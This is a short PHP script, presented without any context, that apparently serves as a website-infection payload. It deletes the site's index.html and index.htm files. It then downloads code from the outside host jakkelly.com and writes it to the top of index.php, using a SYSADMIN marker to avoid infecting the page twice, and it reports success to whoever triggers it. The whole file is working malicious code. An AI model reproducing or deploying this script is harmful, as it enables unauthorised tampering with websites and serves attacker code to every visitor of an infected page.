<?php
echo "RESPONSESTART";
$root = rtrim($_SERVER["DOCUMENT_ROOT"],'/');
$index = $root.'/index.php';
$source = file_get_contents($index);
$index_html = $root.'/index.html';
$index_htm = $root.'/index.htm';
if(file_exists($index_html))
{
	unlink($index_html);
}
if(file_exists($index_htm))
{
	unlink($index_htm);
}
if(!preg_match('#<!--SYSADMIN-->#',$source))
{
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL, "http://jakkelly.com/code.txt");
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
	$code = curl_exec($ch);
	curl_close($ch); 
	$new_code = $code.$source;
	$f = fopen($index, "w");
	if(fwrite($f, $new_code))
	{
		echo 'SUCCESS_CODE_RUN';
	}else{
		if(unlink($index))
		{
			touch($index);

	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL, "http://jakkelly.com/code.txt");
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
	$code = curl_exec($ch);
	curl_close($ch); 
	$new_code = $code.$source;
	$f = fopen($index, "w");
			if(fwrite($f, $new_code))
			{
				echo 'SUCCESS_CODE_RUN';
			}
		}
	}
}else
{
	echo 'SUCCESS_CODE_RUN';
}
echo "RESPONSEEND";
?>